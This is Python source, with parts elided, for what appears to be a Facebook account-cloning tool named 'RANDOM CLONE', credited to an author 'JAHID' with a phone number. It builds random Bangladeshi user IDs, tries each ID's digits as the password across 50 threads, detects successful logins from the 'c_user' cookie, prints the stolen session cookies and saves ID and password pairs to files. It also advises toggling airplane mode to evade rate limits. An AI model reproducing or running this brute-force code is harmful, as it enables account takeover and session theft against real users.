...
••••••••••••••••••••••••••••••••••••••••••••••••••\033[35;1m
[-] AUTHOR    :\033[35;1 JAHID VAU
\033[1;33m[-] GITHUB    :\033[1;33m JAHID-404
\033[32;1m[-] WhatsApp  :\033[32;1m 01323067634
\033[34;1m[-] TOOLS     :\033[34;1m RANDOM CLONE
\033[31;1m[-] VERSION   :\033[31;1m 1.3
\033[92;1m[-] STATUS    :\033[92;1m Free
\033[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••""")
 
def linex():
	print('\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mIJAHID-BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●')
loop = 0
oks = []
cps = []
...
def xxr():
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 2000, 3000, 5000,10000 \n \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mIBRAHIM-BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●PUT CLONING LIMIT: '))
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[35;1m[\033[35;1m•\033[35;1m]\033[35;1mTOTAL IDS: {xr}'+tl)
        print(f'{x} \033[1;33m[\033[1;33m•\033[1;33m]\033[1;33m THE PROCESS HAS BEEN STARTED')
        print(f' \033[32;1m[\033[32;1m•\033[32;1m]\033[32;1m WORK CUNTRY \033[1;97m: \033[32;1m BANGLADESH')
        print(f' \033[34;1m[\033[34;1m•\033[34;1m]\033[34;1m TOOL OWNER \033[1;97m: \033[34;1m JAHID-BOSS')
        print(f' \033[31;1m[\033[31;1m•\033[31;1m]\033[31;1m USE NETWORK  \033[1;97m:  \033[31;1m 2G, 3G, 4G, 5G ')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f" \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mJAHID-BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
    ...
    print(f"\n{x} \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mIBRAHIM-BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [JAHID-BOSS-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/JAHID-BOSS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [JAHID-BOSS-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/JAHID-BOSS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}JAHID-BOSS-99 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
